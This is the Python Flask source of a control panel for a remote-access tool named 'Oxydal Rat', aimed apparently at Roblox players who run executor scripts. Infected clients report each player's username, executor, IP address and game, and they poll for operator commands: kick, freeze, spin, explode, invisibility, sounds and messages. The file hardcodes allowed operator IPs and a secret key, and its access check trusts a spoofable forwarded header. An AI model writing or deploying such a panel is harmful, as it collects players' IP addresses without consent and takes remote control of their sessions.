from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "change_this_secret_key_2025"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# === IPs autorisées ===
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1", "::1"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return """
    <html><body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{}</b></p>
    </body></html>
    """.format(detected), 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
<style>
    :root { --cyan:#00ffaa; --bg:#0a0e17; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'Rajdhani',sans-serif; background:radial-gradient(circle at top,#0f2027,#000); color:#fff; min-height:100vh; overflow:hidden; display:flex; position:relative; }
    canvas { position:absolute; top:0; left:0; z-index:1; opacity:0.35; pointer-events:none; }

    .sidebar { position:fixed; width:280px; height:100%; background:rgba(10,10,20,0.95); padding:30px; border-right:1px solid #333; z-index:10; backdrop-filter:blur(10px); }
    .sidebar h2 { font-family:'Orbitron'; color:var(--cyan); font-size:2rem; text-align:center; margin-bottom:50px; text-shadow:0 0 20px var(--cyan); animation:g 2s infinite alternate; }
    @keyframes g { from { text-shadow:0 0 10px var(--cyan); } to { text-shadow:0 0 35px var(--cyan); } }

    .main-content { margin-left:280px; padding:40px; height:100vh; overflow-y:auto; }

    h1 { font-family:'Orbitron'; font-size:4.5rem; text-align:center; background:linear-gradient(45deg,#00ffaa,#00ffff,#ff00ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
    .stats { text-align:center; font-size:2rem; margin:30px 0; color:var(--cyan); text-shadow:0 0 15px var(--cyan); }

    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(380px,1fr)); gap:30px; }
    .card { background:rgba(20,25,40,0.9); border-radius:20px; padding:28px; border:1px solid rgba(0,255,170,0.3); box-shadow:0 0 30px rgba(0,0,0,0.8); transition:all .4s; }
    .card:hover { transform:translateY(-12px) scale(1.03); box-shadow:0 0 50px rgba(0,255,170,0.5); }

    .dot { width:16px; height:16px; border-radius:50%; background:#ff3366; box-shadow:0 0 15px #ff3366; animation:p 2s infinite; }
    .dot.online { background:var(--cyan); box-shadow:0 0 25px var(--cyan); }
    @keyframes p { 0%,100% {opacity:0.8} 50% {opacity:1; transform:scale(1.2)} }

    .name a, .game-link { color:#ffcc00; text-decoration:none; font-weight:bold; }
    .name a:hover, .game-link:hover { color:var(--cyan); text-decoration:underline; }

    button.kick-btn { padding:14px 20px; border:none; border-radius:15px; font-weight:bold; color:#fff; cursor:pointer; transition:.3s; margin:5px; }
    button.kick-btn:hover { transform:scale(1.1); }

    .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); backdrop-filter:blur(10px); align-items:center; justify-content:center; z-index:1000; }
    .modal.active { display:flex; }
    .modal-content { background:#111; padding:40px; border-radius:25px; width:90%; max-width:550px; border:2px solid var(--cyan); box-shadow:0 0 60px rgba(0,255,170,0.6); }
</style>
</head>
<body>
<canvas id="particles"></canvas>

<div class="sidebar">
    <h2>OXYDAL RAT</h2>
    <button class="nav-btn active" onclick="showPage('playersPage',this)">Players</button>
    <button class="nav-btn" onclick="showPage('historyPage',this)">History</button>
</div>

<div class="main-content">
    <div id="playersPage" class="page active">
        <h1>Oxydal Rat</h1>
        <div class="stats" id="stats">Players online: <b>0</b></div>
        <div class="grid" id="players"></div>
    </div>
    <div id="historyPage" class="page">
        <h1>History Logs</h1>
        <div style="text-align:right;margin:20px;">
            <button class="kick-btn" style="background:#444;" onclick="document.getElementById('historyList').innerHTML=''">Clear</button>
        </div>
        <div id="historyList"></div>
    </div>
</div>

<!-- Modals -->
<div class="modal" id="kickModal"><div class="modal-content">
    <h2>Kick Player</h2>
    <input type="text" id="kickReason" placeholder="Reason (ex: ss)" autofocus>
    <div style="display:flex;gap:15px;margin-top:20px;">
        <button style="background:#444;flex:1;padding:15px;border:none;border-radius:12px;" id="cancelKick">Cancel</button>
        <button style="background:linear-gradient(45deg,#ff3366,#ff5588);flex:1;padding:15px;border:none;border-radius:12px;" id="confirmKick">Confirm</button>
    </div>
</div></div>

<script>
const socket = io(); let currentKickId = null;

// Particules
const canvas = document.getElementById('particles'); const ctx = canvas.getContext('2d');
canvas.width = innerWidth; canvas.height = innerHeight;
const particles = Array.from({length:80},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height,size:Math.random()*4+1,sx:Math.random()*1-0.5,sy:Math.random()*1-0.5}));
function anim(){ ctx.clearRect(0,0,canvas.width,canvas.height);
    particles.forEach(p=>{ ctx.fillStyle='rgba(0,255,170,0.6)'; ctx.beginPath(); ctx.arc(p.x,p.y,p.size,0,Math.PI*2); ctx.fill();
        p.x+=p.sx; p.y+=p.sy; if(p.x<0||p.x>canvas.width) p.sx*=-1; if(p.y<0||p.y>canvas.height) p.sy*=-1;
    }); requestAnimationFrame(anim);
} anim();
window.addEventListener('resize',()=>{canvas.width=innerWidth;canvas.height=innerHeight;});

function showPage(id,btn){
    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
    document.getElementById(id).classList.add('active'); btn.classList.add('active');
}

function addLog(m,t){ const d=document.createElement("div"); d.className=`history-item ${t}`;
    d.innerHTML=`<span>${m}</span><span style="margin-left:auto;color:#666;font-size:0.8rem;">${new Date().toLocaleTimeString()}</span>`;
    document.getElementById("historyList").prepend(d);
}

function toast(m,t="success"){ const e=document.createElement("div"); e.className="toast"+(t==="danger"?" danger":"");
    e.textContent=m; document.getElementById("toasts").appendChild(e); setTimeout(()=>e.remove(),5000);
}

function openKickModal(id){ currentKickId=id; document.getElementById("kickModal").classList.add("active"); }
function closeKickModal(){ document.getElementById("kickModal").classList.remove("active"); }
function performKick(){
    const r = document.getElementById("kickReason").value.trim();
    const reason = r || "Kicked by Oxydal Rat";
    fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:reason})});
    closeKickModal();
}

function sendTroll(id,cmd,asset=null){
    fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd,assetId:asset})});
}

document.getElementById("cancelKick").onclick = closeKickModal;
document.getElementById("confirmKick").onclick = performKick;

function render(data){
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b>`;
    const grid = document.getElementById("players");
    const ids = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id,p])=>{
        let card = document.getElementById(`card_${id}`);
        if(!card){
            card = document.createElement("div"); card.className="card"; card.id=`card_${id}`; grid.appendChild(card);
            addLog(`Connect: ${p.username} (${id})`,"connect");
        }
        card.innerHTML = `
            <div style="display:flex;align-items:center;gap:10px;margin-bottom:15px;">
                <div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span>
            </div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div style="color:#ccc;margin:15px 0;line-height:1.8;">
                Executor: ${p.executor}<br>
                IP: ${p.ip}<br>
                Game: <a href="https://www.roblox.com/games/${p.gameId}/" target="_blank" style="color:#ffcc00;">${p.game}</a>
            </div>

            <div style="margin:20px 0;font-weight:bold;color:var(--cyan);">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:#ff00ff;" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:#00ffff;" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:#ffff00;" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:#88ff88;" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:#ff5555;" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:#5555ff;" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="kick-btn" style="background:orange;" onclick="sendTroll('${id}','playsound',prompt('Asset ID:'))">SOUND</button>
                <button class="kick-btn" style="background:#00ffff;grid-column:span 2;" onclick="sendTroll('${id}','message',prompt('Message:'))">MESSAGE</button>
            </div>

            <div style="margin:20px 0 10px;font-weight:bold;color:var(--cyan);">UNDO</div>
            <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:8px;">
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RB</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','stopsound')">STOP SND</button>
            </div>
        `;
    });

    document.querySelectorAll('.card').forEach(c=>{
        if(!ids.has(c.id.replace('card_',''))){ addLog(`Disconnect: ${c.querySelector('.name').textContent.split(' (ID')[0]}`, "disconnect"); c.remove(); }
    });
}

socket.on("update", render);
socket.on("kick_notice", d=>{ toast(`${d.username} → ${d.reason}`, "danger"); addLog(`KICK: ${d.username} | ${d.reason}`, "action"); });
</script>
<div class="toast-container" id="toasts"></div>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username","Unknown"),
                    "executor": d.get("executor","Unknown"),
                    "ip": d.get("ip","Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game","Unknown"),
                    "gameId": d.get("gameId",0)
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid",""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            r = pending_kicks.pop(uid, "Kicked by Oxydal Rat")
            return jsonify({"command": "kick", "reason": r})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            asset = None
            if isinstance(cmd, dict):
                asset = cmd.get("assetId")
                cmd = cmd.get("cmd")
            return jsonify({"command": cmd, "assetId": asset})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid",""))
    reason = data.get("reason","Kicked by Oxydal Rat")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": reason})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid",""))
    cmd = data.get("cmd","")
    asset = data.get("assetId")
    if uid and cmd:
        pending_commands[uid] = {"cmd": cmd, "assetId": asset} if asset else cmd
        name = connected_players.get(uid, {}).get("username", "Unknown")
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
